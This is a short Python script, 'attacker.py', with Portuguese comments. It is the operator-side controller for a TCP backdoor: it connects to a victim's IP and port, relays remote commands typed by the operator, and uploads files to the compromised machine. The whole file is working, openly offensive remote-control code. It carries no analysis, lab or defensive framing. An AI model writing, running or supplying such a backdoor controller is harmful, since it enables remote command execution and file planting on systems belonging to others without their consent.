############################################
#              attacker.py                 #
#  Controller (conecta ao backdoor TCP)    #
#  Funcoes:                                #
#  - Enviar comandos remotos               #
#  - Fazer upload de arquivos              #
############################################

import socket
import sys

if len(sys.argv) != 3:
    print(f"Uso: python3 {sys.argv[0]} <IP_da_vitima> <porta>")
    sys.exit(1)

HOST = sys.argv[1]
PORT = int(sys.argv[2])

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

try:
    while True:
        response = client.recv(4096)
        if not response:
            break
        print(response.decode(), end='')

        cmd = input()
        if cmd.strip().startswith('UPLOAD'):
            _, filename = cmd.strip().split(maxsplit=1)
            try:
                with open(filename, 'rb') as f:
                    file_data = f.read()
                client.send(f'{cmd}\n'.encode())
                ack = client.recv(1024)
                print(ack.decode(), end='')
                client.send(file_data)
                print("Arquivo enviado com sucesso.")
            except FileNotFoundError:
                print("Arquivo nao encontrado.")
        else:
            client.send(f'{cmd}\n'.encode())
except KeyboardInterrupt:
    print("\n[!] Conexao encerrada pelo usuario.")
    client.close()
